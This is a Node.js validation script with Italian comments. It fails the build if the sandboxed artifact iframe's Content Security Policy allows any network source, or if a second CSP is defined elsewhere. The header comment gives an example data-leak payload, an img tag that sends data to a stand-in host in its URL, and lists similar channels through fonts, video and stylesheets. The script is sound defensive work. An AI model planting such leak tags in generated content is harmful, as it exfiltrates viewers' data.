#!/usr/bin/env node
/**
 * La CSP degli artefatti non ammette NESSUNA sorgente di rete.
 *
 * Un artefatto è contenuto generato: gira in un iframe `sandbox` a origine
 * opaca perché chi lo ha scritto non è chi lo guarda. Il confinamento vale però
 * solo finché non può **chiedere** niente all'esterno: una richiesta di risorsa
 * è un canale in uscita: `<img src="https://x/leak?d=…">` consegna i dati
 * nell'URL, dal browser dell'owner, e non ha bisogno di alcuna risposta.
 * (clodia-platform#175, riga ereditata #108.)
 *
 * Il controllo guarda TUTTE le direttive, non solo `img-src`: chiudere una sola
 * porta sposta il canale invece di chiuderlo — `<video src>`, un `@font-face`
 * remoto o un `<link rel=stylesheet>` fanno la stessa richiesta con lo stesso
 * effetto. È il motivo per cui questo file esiste al posto di una riga di
 * commento: la tentazione di riammettere `https:` «solo per le immagini» torna,
 * e torna con una buona ragione.
 *
 * Sorgenti ammesse: `'none'`, `'self'`, `'unsafe-inline'`, `data:`, `blob:` —
 * ciò che l'artefatto porta con sé o scrive inline. Qualunque altro token (uno
 * schema come `https:`, un host, un `*`) è un rifiuto.
 *
 * Limite dichiarato: legge la CSP dalla costante di `src/lib/artifact-frame.ts`,
 * che è il posto unico da cui la prendono entrambe le viste (pannello e
 * `/preview`). Una seconda CSP scritta a mano altrove non la vedrebbe — per
 * questo il controllo verifica anche che nessun altro file monti un
 * `Content-Security-Policy` per conto proprio.
 */
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';

const RADICE = new URL('../src', import.meta.url).pathname;
const SORGENTE = join(RADICE, 'lib/artifact-frame.ts');
const AMMESSE = new Set(["'none'", "'self'", "'unsafe-inline'", 'data:', 'blob:']);

const colpe = [];

// ── 1. la CSP unica: nessuna sorgente di rete in nessuna direttiva ────────────
const testo = readFileSync(SORGENTE, 'utf8');
const blocco = testo.match(/export const CSP\s*=([\s\S]*?);\n/);
if (!blocco) {
	console.error(`CSP non trovata in ${SORGENTE}: il controllo non sa cosa guardare.`);
	process.exit(1);
}
// Concatenazione di letterali → il testo della policy, senza le virgolette.
const policy = [...blocco[1].matchAll(/'([^']*)'|"([^"]*)"/g)]
	.map((m) => m[1] ?? m[2])
	.join('')
	.replace(/^.*content="/s, '')
	.replace(/">\s*$/, '');

const direttive = policy
	.split(';')
	.map((d) => d.trim())
	.filter(Boolean);

if (!direttive.some((d) => /^default-src\s+'none'$/.test(d))) {
	colpe.push("manca `default-src 'none'`: ciò che non è elencato resterebbe aperto");
}
for (const d of direttive) {
	const [nome, ...sorgenti] = d.split(/\s+/);
	for (const s of sorgenti) {
		if (!AMMESSE.has(s)) colpe.push(`${nome}: sorgente di rete \`${s}\``);
	}
}

// ── 2. nessuna seconda CSP scritta a mano altrove ─────────────────────────────
function sorgenti(dir) {
	const out = [];
	for (const e of readdirSync(dir)) {
		const p = join(dir, e);
		if (statSync(p).isDirectory()) out.push(...sorgenti(p));
		else if (/\.(svelte|ts|js)$/.test(e)) out.push(p);
	}
	return out;
}
for (const f of sorgenti(RADICE)) {
	if (f === SORGENTE) continue;
	const t = readFileSync(f, 'utf8');
	for (const m of t.matchAll(/Content-Security-Policy/g)) {
		// Un commento che la nomina va bene; un `content="…"` è una seconda copia.
		const intorno = t.slice(m.index, m.index + 200);
		if (!/content\s*=\s*["'`]/.test(intorno)) continue;
		const riga = t.slice(0, m.index).split('\n').length;
		colpe.push(
			`${f.replace(RADICE, 'src')}:${riga} monta una CSP propria: ` +
				'la policy vive una volta sola, in artifact-frame.ts'
		);
	}
}

if (colpe.length) {
	console.error(
		'La CSP degli artefatti ammette una sorgente di rete: un GET verso un host\n' +
			"esterno parte dal browser di chi legge, e i dati stanno nell'URL — non\n" +
			'serve risposta perché siano usciti. Ammesse solo data:, blob: e inline.\n'
	);
	for (const c of colpe) console.error('  ' + c);
	process.exit(1);
}
console.log('CSP degli artefatti: nessuna sorgente di rete ✓');
